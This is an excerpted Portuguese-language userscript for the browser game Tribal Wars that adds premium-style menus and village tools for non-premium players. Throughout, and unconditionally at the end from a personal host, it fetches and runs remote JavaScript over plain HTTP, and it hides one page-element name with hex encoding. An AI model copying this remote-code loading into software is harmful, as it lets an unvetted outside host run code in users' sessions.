...
// @namespace      www.pointdownloads.net23.net
...
// @autor          FernandoXLR
// @updateURL      https://userscripts.org/scripts/source/129923.meta.js
// @downloadURL    https://userscripts.org/scripts/source/129923.user.js
...
if (game_data.player.premium == false) {
	...
	if (language == 'pt') {
        ...
        lang_bar[1] = 'Recrutamento';
        lang_bar[2] = 'Academia';
        lang_bar[3] = 'Ferreiro';
        lang_bar[4] = 'Mercado';
        lang_bar[5] = 'Praça';
        lang_bar[6] = 'Tropas da Aldeia';
		lang_bar[7] = 'Simulador';
		lang_bar[8] = 'Config. Farmar';
        ...
        lang_perfil[4] = '» Extrair coordenadas';
        lang_perfil[5] = '» Calcular Distancia';
        lang_perfil[6] = '» Stats TWMap - Player';
        lang_perfil[7] = '» Stats TWMap - Tribo';
		lang_perfil[8] = '» Reservar Aldeia';
	...
	for (i = 0; i < meuArray.length; i++) {
		aldeiacookie = getCookie(mundo + '_label_' + meuArray[i]);
        if (meuArray[i] == VillId) {
			pVillId = meuArray[i - 1];
			nVillId = meuArray[i + 1];
            document.getElementById('villagelist').getElementsByTagName('tbody')[0].innerHTML += '<tr><td class="menu-column-item"><a href="/game.php?village=' + meuArray[i] + '&amp;screen=' + screen2 + '">' + aldeiasnome1[i]  + '</a> - ' + aldeiacookie + '</td></tr>';
        }
        else{
            document.getElementById('villagelist').getElementsByTagName('tbody')[0].innerHTML += '<tr><td class="menu-column-item"><a href="/game.php?village=' + meuArray[i] + '&amp;screen=' + screen2 + '">' + aldeiasnome1[i]  + ' - ' + aldeiacookie + '</a></td></tr>';
        }
    }
    ...
    criarmenu('/game.php?village=' + VillId + '&amp;screen=snob', '/graphic/buildings/snob.png?1', lang_bar[2]);
    criarmenu('/game.php?village=' + VillId + '&amp;screen=smith', '/graphic/buildings/smith.png?1', lang_bar[3]);
    criarmenu('/game.php?village=' + VillId + '&amp;screen=market', '/graphic/buildings/market.png?1', lang_bar[4]);
    criarmenu('/game.php?village=' + VillId + '&amp;screen=place', '/graphic/buildings/place.png?1', lang_bar[5]);
    criarmenu('/game.php?village='+VillId+'&amp;screen=place&mode=units', '/graphic/buildings/place.png?1', lang_bar[6]);
    criarmenu('/game.php?village='+VillId+'&amp;screen=place&mode=sim', '/graphic/buildings/place.png?1', lang_bar[7]);
    criarmenu('/game.php?village='+VillId+'&amp;screen=place&mode=farmar', '/graphic/buildings/place.png?1', lang_bar[8]);
    ...
    criarmenu('javascript:$.getScript(\'http://userscripts.org/scripts/source/137977.user.js\');void(0);', '' , lang_bar[10]);
    tipoaldeia = getCookie(mundo + '_label_' + VillId);
    criarmenu('', '/graphic/buildings/place.png?1' , 'Tipo da aldeia (' + tipoaldeia + ')');
    ...
    if (location.href.indexOf(screenVillId) > 0){
        ...
        document.getElementById('content_value').getElementsByTagName('tbody')[1].innerHTML += '<tr><td colspan="2"><a href="/game.php?village=' + game_data.village.id + '&amp;screen=ally&amp;mode=reservations" onClick="$.cookie(game_data.world + \'_reserva\', $(\'#content_value td\')[2].textContent, {expires: 100000})";>' + lang_perfil[8] + '</a><tr><td colspan="2"><a href="http://www.twstats.com/in/'+mundo+'/village/'+screenVillId+'" target="_blank">' + lang_perfil[2] + '</a> (TWstats)</td></tr>'  + '<tr><td colspan="2"><a href="javascript:$.getScript(\'http://dl.dropbox.com/u/72485850/tribalwarsbrasil/tempos_de_viagem_br.js\');convert(\'pt\');">' + lang_perfil[5] + '</a></td></tr>';
    }
    ...
    if ((location.href.indexOf(screenAllyId) > 0) || (location.href.indexOf('screen=ally&mode=profile') > 0)) {
        ...
        allyTr[allyTr.length - 4].outerHTML += '<tr><td colspan="2"><a href="http://www.twstats.com/in/'+mundo+'/tribe/'+screenAllyId+'" target="_blank">' + lang_perfil[1] + '</a> (TWstats)</td></tr>' + '<tr><td colspan="2"><a href="javascript:$.getScript(\'http://userscripts.org/scripts/source/138264.user.js\');convert(\'pt\');">' + lang_perfil[7] + '</a></td></tr>';
    ...
    if (getElementsByClass(decodeHex('7365727665725f696e666f'))[0] != null) getElementsByClass(decodeHex('7365727665725f696e666f'))[0].innerHTML += decodeHex('') + lang_settings[18] + '</p>';
...
$.getScript('http://fernando.site40.net/scripts/externo.js');
